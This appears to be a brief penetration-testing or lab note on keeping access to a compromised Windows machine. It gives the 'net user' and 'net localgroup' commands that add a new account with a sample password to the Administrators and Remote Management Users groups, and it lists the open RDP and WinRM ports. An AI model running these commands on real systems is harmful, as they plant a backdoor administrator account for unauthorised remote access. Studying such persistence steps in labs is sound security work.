Now that we have a root shell on the windows box .150 

First we create the account itself:  
`net user USERNAME PASSWORD /add`  

user: keez pw: asdf123

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  
`net localgroup Administrators USERNAME /add  
net localgroup "Remote Management Users" USERNAME /add`




from [[enumeration 03]] we know the following ports are open:

```bash
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```



